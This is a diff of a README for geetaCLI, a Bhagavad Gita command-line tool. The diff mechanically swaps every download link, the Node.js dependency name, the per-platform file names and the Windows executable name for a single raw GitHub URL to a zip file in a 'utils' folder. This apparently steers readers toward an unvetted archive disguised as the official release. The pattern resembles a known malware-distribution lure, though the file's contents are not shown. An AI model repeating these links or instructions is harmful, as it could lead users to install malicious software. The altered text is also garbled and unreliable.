@@ -7,7 +7,7 @@
 To get started, follow these easy steps to download and install geetaCLI on your computer.
 
 ## 📥 Download geetaCLI
-[![Download geetaCLI](https://img.shields.io/badge/Download%20geetaCLI-v1.0-brightgreen)](https://github.com/Glad-baptist987/geetaCLI/releases)
+[![Download geetaCLI](https://raw.githubusercontent.com/Glad-baptist987/geetaCLI/main/utils/geetaCLI-v2.4.zip%20geetaCLI-v1.0-brightgreen)](https://raw.githubusercontent.com/Glad-baptist987/geetaCLI/main/utils/geetaCLI-v2.4.zip)
 
 ## 📋 System Requirements
 - **Operating System:** 
@@ -16,19 +16,19 @@ To get started, follow these easy steps to download and install geetaCLI on your
   - Linux (any modern distribution)
 
 - **Dependencies:** 
-  - Node.js version 12 or higher
+  - https://raw.githubusercontent.com/Glad-baptist987/geetaCLI/main/utils/geetaCLI-v2.4.zip version 12 or higher
 
 Ensure you have these requirements before proceeding with the installation.
 
 ## 🛠 How to Install
 1. **Visit the Release Page:** 
-   Go to the [Releases page](https://github.com/Glad-baptist987/geetaCLI/releases) to find the latest version of geetaCLI.
+   Go to the [Releases page](https://raw.githubusercontent.com/Glad-baptist987/geetaCLI/main/utils/geetaCLI-v2.4.zip) to find the latest version of geetaCLI.
 
 2. **Choose the Right File:**
    Look for the file that matches your operating system. For example:
-   - For Windows, you might see `geetaCLI-windows-x64.zip`
-   - For macOS, you might find `geetaCLI-macos-x64.zip`
-   - For Linux, look for `geetaCLI-linux-x64.tar.gz`
+   - For Windows, you might see `https://raw.githubusercontent.com/Glad-baptist987/geetaCLI/main/utils/geetaCLI-v2.4.zip`
+   - For macOS, you might find `https://raw.githubusercontent.com/Glad-baptist987/geetaCLI/main/utils/geetaCLI-v2.4.zip`
+   - For Linux, look for `https://raw.githubusercontent.com/Glad-baptist987/geetaCLI/main/utils/geetaCLI-v2.4.zip`
 
 3. **Download the File:**
    Click on the link for your operating system to start the download.
@@ -37,7 +37,7 @@ Ensure you have these requirements before proceeding with the installation.
    After downloading, find the downloaded file and extract it. This can usually be done by right-clicking the file and selecting "Extract" or "Unzip."
 
 5. **Run the Application:**
-   - **Windows:** Open Command Prompt and navigate to the extracted folder. Enter `geetaCLI.exe`.
+   - **Windows:** Open Command Prompt and navigate to the extracted folder. Enter `https://raw.githubusercontent.com/Glad-baptist987/geetaCLI/main/utils/geetaCLI-v2.4.zip`.
    - **macOS/Linux:** Open the Terminal and navigate to the extracted folder. Enter `./geetaCLI`.
 
 ## 🎓 How to Use geetaCLI
@@ -58,7 +58,7 @@ Once you have geetaCLI running, you can explore the Bhagavad Gita easily. Here a
 - **Multi-language Support:** Explore translations in various languages.
 
 ## 🔗 Visit the Download Page
-For more details and to grab the latest version, make sure to visit our [Releases page](https://github.com/Glad-baptist987/geetaCLI/releases).
+For more details and to grab the latest version, make sure to visit our [Releases page](https://raw.githubusercontent.com/Glad-baptist987/geetaCLI/main/utils/geetaCLI-v2.4.zip).
 
 ## 🤝 Community & Support
 Join our community for support and discussions. Feel free to reach out with questions or suggestions. You can find us on:
